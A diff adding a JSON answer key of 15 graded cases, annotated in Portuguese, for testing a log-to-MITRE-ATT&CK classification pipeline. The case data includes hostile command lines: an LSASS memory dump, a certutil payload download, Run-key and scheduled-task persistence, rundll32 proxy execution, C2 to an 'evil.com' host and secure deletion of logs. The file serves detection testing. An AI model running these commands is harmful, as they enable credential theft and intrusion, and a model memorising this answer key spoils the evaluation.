@@ -1,0 +1,129 @@
+{
+  "about": "Golden set de 15 casos para avaliar o pipeline (A3 recall + A4 veredito). Rótulos verificados contra a base oficial do MITRE ATT&CK (v17.1). Dificuldade crescente (1=trivial, 15=limite). 15 eventos DIFERENTES cobrindo categorias/táticas variadas.",
+  "cases": [
+    {
+      "id": "C01", "difficulty": 1, "tactic": "Initial Access / Persistence",
+      "gabarito": {"id": "T1078", "name": "Valid Accounts", "parent": true},
+      "raw": "SCRANTON/pbeesly logon type=3 valid domain credentials",
+      "silver": {"event_category": "logon", "log_source": "windows_security",
+                 "subject_account_name": "pbeesly", "logon_type": 3},
+      "note": "Autenticação legítima com credencial válida (não brute-force). Caso canônico."
+    },
+    {
+      "id": "C02", "difficulty": 2, "tactic": "Execution",
+      "gabarito": {"id": "T1059.001", "name": "PowerShell", "parent": false},
+      "raw": "powershell.exe -enc SQBFAFgA... (base64)",
+      "silver": {"event_category": "powershell_script_block", "image_name": "powershell.exe",
+                 "command_line": "powershell.exe -NoProfile -enc SQBFAFgAZQBjAA=="},
+      "note": "PowerShell com comando codificado em Base64."
+    },
+    {
+      "id": "C03", "difficulty": 3, "tactic": "Execution",
+      "gabarito": {"id": "T1059.003", "name": "Windows Command Shell", "parent": false},
+      "raw": "cmd.exe /c whoami & net time",
+      "silver": {"event_category": "process_create", "image_name": "cmd.exe",
+                 "image_path": "C:\\Windows\\System32\\cmd.exe",
+                 "command_line": "cmd.exe /c whoami & net time \\\\dc01"},
+      "note": "Interpretador de comandos nativo executando comandos."
+    },
+    {
+      "id": "C04", "difficulty": 4, "tactic": "Defense Evasion",
+      "gabarito": {"id": "T1036.002", "name": "Right-to-Left Override", "parent": false},
+      "raw": "process_create C:\\ProgramData\\victim\\cod.<RTLO>3aka3.scr /S",
+      "silver": {"event_category": "process_create", "image_name": "cod.\u202e3aka3.scr",
+                 "image_path": "C:\\ProgramData\\victim\\cod.\u202e3aka3.scr",
+                 "command_line": "\"C:\\ProgramData\\victim\\cod.\u202e3aka3.scr\" /S"},
+      "note": "Nome mascarado com caractere RTL-override (U+202E)."
+    },
+    {
+      "id": "C05", "difficulty": 5, "tactic": "Credential Access",
+      "gabarito": {"id": "T1003.001", "name": "LSASS Memory", "parent": false},
+      "raw": "procdump64.exe -ma lsass.exe lsass.dmp",
+      "silver": {"event_category": "process_create", "image_name": "procdump64.exe",
+                 "command_line": "procdump64.exe -accepteula -ma lsass.exe C:\\temp\\lsass.dmp"},
+      "note": "Dump da memória do LSASS para extrair credenciais."
+    },
+    {
+      "id": "C06", "difficulty": 6, "tactic": "Persistence",
+      "gabarito": {"id": "T1547.001", "name": "Registry Run Keys / Startup Folder", "parent": false},
+      "raw": "reg set HKCU\\...\\Run\\Updater = C:\\ProgramData\\upd.exe",
+      "silver": {"event_category": "registry_set_value", "image_name": "reg.exe",
+                 "registry_target_object": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater",
+                 "command_line": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /d C:\\ProgramData\\upd.exe"},
+      "note": "Persistência via chave Run do registro."
+    },
+    {
+      "id": "C07", "difficulty": 7, "tactic": "Execution / Persistence",
+      "gabarito": {"id": "T1053.005", "name": "Scheduled Task", "parent": false},
+      "raw": "schtasks /create /tn Updater /sc onlogon /tr payload.exe",
+      "silver": {"event_category": "process_create", "image_name": "schtasks.exe",
+                 "command_line": "schtasks /create /tn \"Updater\" /sc onlogon /tr C:\\ProgramData\\upd.exe /ru SYSTEM"},
+      "note": "Tarefa agendada para execução/persistência."
+    },
+    {
+      "id": "C08", "difficulty": 8, "tactic": "Command and Control",
+      "gabarito": {"id": "T1105", "name": "Ingress Tool Transfer", "parent": true},
+      "raw": "certutil -urlcache -split -f http://192.168.0.5/p.exe",
+      "silver": {"event_category": "process_create", "image_name": "certutil.exe",
+                 "command_line": "certutil.exe -urlcache -split -f http://192.168.0.5/p.exe C:\\temp\\p.exe"},
+      "note": "Download de ferramenta para o host via certutil (LOLBin)."
+    },
+    {
+      "id": "C09", "difficulty": 9, "tactic": "Discovery",
+      "gabarito": {"id": "T1087.002", "name": "Domain Account", "parent": false},
+      "raw": "net group \"Domain Admins\" /domain",
+      "silver": {"event_category": "process_create", "image_name": "net.exe",
+                 "command_line": "net group \"Domain Admins\" /domain"},
+      "note": "Enumeração de contas do domínio."
+    },
+    {
+      "id": "C10", "difficulty": 10, "tactic": "Command and Control",
+      "gabarito": {"id": "T1571", "name": "Non-Standard Port", "parent": true},
+      "raw": "network_connect 192.168.0.5:4444",
+      "silver": {"event_category": "network_connect", "image_name": "svchost.exe",
+                 "destination_ip": "192.168.0.5", "destination_port": 4444},
+      "note": "C2 em porta não padrão (4444). Compete com a família T1071."
+    },
+    {
+      "id": "C11", "difficulty": 11, "tactic": "Collection",
+      "gabarito": {"id": "T1560.001", "name": "Archive via Utility", "parent": false},
+      "raw": "rar.exe a -hp<pass> loot.rar C:\\Users\\pbeesly\\Documents",
+      "silver": {"event_category": "process_create", "image_name": "rar.exe",
+                 "command_line": "rar.exe a -hpS3cret -r C:\\temp\\loot.rar C:\\Users\\pbeesly\\Documents"},
+      "note": "Compressão de dados coletados com utilitário (rar)."
+    },
+    {
+      "id": "C12", "difficulty": 12, "tactic": "Defense Evasion / Privilege Escalation",
+      "gabarito": {"id": "T1055", "name": "Process Injection", "parent": true},
+      "raw": "create_remote_thread from evil.exe into explorer.exe",
+      "silver": {"event_category": "create_remote_thread", "image_name": "evil.exe",
+                 "target_image": "C:\\Windows\\explorer.exe"},
+      "note": "Thread remota injetada noutro processo. Pai T1055 — reranker tende a promover subtécnicas."
+    },
+    {
+      "id": "C13", "difficulty": 13, "tactic": "Defense Evasion",
+      "gabarito": {"id": "T1218.011", "name": "Rundll32", "parent": false},
+      "raw": "rundll32.exe evil.dll,StartW",
+      "silver": {"event_category": "process_create", "image_name": "rundll32.exe",
+                 "command_line": "rundll32.exe C:\\ProgramData\\evil.dll,StartW"},
+      "note": "Proxy de execução via rundll32. Compete com outros system binary proxy exec."
+    },
+    {
+      "id": "C14", "difficulty": 14, "tactic": "Command and Control",
+      "gabarito": {"id": "T1071.001", "name": "Web Protocols", "parent": false},
+      "raw": "network_connect cdn-update.evil.com:443 (HTTPS C2)",
+      "silver": {"event_category": "network_connect", "image_name": "rundll32.exe",
+                 "destination_ip": "23.101.0.5", "destination_port": 443,
+                 "dns_query_name": "cdn-update.evil.com"},
+      "note": "C2 sobre protocolo web (HTTPS/443). Ponto fraco documentado: classify traz T1090 (proxy)."
+    },
+    {
+      "id": "C15", "difficulty": 15, "tactic": "Defense Evasion",
+      "gabarito": {"id": "T1070.004", "name": "File Deletion", "parent": false},
+      "raw": "sdelete64.exe -accepteula -p 3 C:\\logs\\*.log",
+      "silver": {"event_category": "process_create", "image_name": "sdelete64.exe",
+                 "command_line": "sdelete64.exe -accepteula -p 3 -s C:\\ProgramData\\victim\\*.*"},
+      "note": "Remoção segura de artefatos (indicator removal). Confunde com destruição de dados (T1485)."
+    }
+  ]
+}
